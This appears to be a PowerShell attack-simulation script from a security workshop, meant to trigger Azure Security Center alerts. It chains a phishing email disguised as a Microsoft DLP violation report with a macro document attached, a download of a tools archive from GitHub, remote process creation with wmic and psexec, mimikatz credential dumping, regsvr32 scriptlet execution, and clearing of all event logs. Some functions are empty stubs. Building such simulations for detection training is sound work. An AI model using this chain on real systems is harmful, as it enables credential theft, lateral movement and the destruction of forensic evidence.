#executes phishing attack
function SendEmail($userEmail)
{
    $password = "#PASSWORD#" | ConvertTo-SecureString

    $credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "#USERNAME#", $password;

    ## Define the Send-MailMessage parameters
    $mailParams = @{
        SmtpServer                 = 'smtp.office365.com'
        Port                       = '587' # or '25' if not using TLS
        UseSSL                     = $true ## or not if using non-TLS
        Credential                 = $credential
        From                       = '#USERNAME#'
        To                         = '#USERNAME#'
        Subject                    = "Microsoft eDiscovery Report - Violation"
        Body                       = 'Data Loss Protection has found outbound mail with PII information'
        DeliveryNotificationOption = 'OnFailure', 'OnSuccess'
        Attachments                = 'DataLossReport.docm'
    }

    ## Send the message
    Send-MailMessage @mailParams;   
}

function ExecuteDocm()
{
    #execute the docm (manually)

    #add a record somewhere the docm was opened...copy to desktop?

    #create the 

    #download the zip file
    $WebClient = New-Object System.Net.WebClient
    $WebClient.DownloadFile("https://github.com/solliancenet/#WORKSHOP_NAME#/raw/main/artifacts/day-02/tools.zip","C:\temp\tools.zip")
  
    #try to extract it to c:/tools
    Expand-Archive -LiteralPath 'C:\temp\tools.zip' -DestinationPath C:\ -Force

    #execute an in-memory powershell attack
    $data = get-content "data.txt";

    #once that is executed...we can do more!
    RunMimikatz;

    #create a task schedule job...
    #TODO
}

function RunMimikatz()
{
    #do the thing...

    #use all this awesome access we now have!
    GoLateral;
}

function GoLateral()
{
    #connect to another machine
}

function clear-all-event-logs ($computerName="localhost")
{
   $logs = Get-EventLog -ComputerName $computername -List | ForEach-Object {$_.Log}
   $logs | ForEach-Object {Clear-EventLog -ComputerName $computername -LogName $_ }
   Get-EventLog -ComputerName $computername -list
}

mkdir c:\job -ea SilentlyContinue;
mkdir c:\tools -ea SilentlyContinue;

cd "C:\labfiles\#WORKSHOP_NAME#\artifacts\day-02"

$userEmail = "#USERNAME#";

SendEmail $userEmail;

#Run the attack
wmic /node:"10.0.0.6" process call create "cmd.exe /c copy c:\windows\system32\svchost.exe c:\job\svchost.exe";

wmic /node:"10.0.0.6" process call create "cmd.exe /c c:\job\svchost.exe";

cd c:/tools;

psexec /accepteula \\10.0.0.6 cmd

hostname

mimikatz.exe "priviledge::debug" "sekurlsa::logonpasswords" "exit" >> c:\tools\target-pc.txt

regsvr32.exe /s /u /i:test.sct scrobj.dll

regsvr32.exe /s /u /i:test.sct PrintIsolationProxy.dll

Copy-Item -path "C:\labfiles\#WORKSHOP_NAME#\artifacts\day-02\logs-03" "c:\logs"

clear-all-event-logs

#referece
#https://github.com/Azure/Azure-Security-Center/blob/main/Simulations/Azure%20Security%20Center%20Security%20Alerts%20Playbook_v2.pdf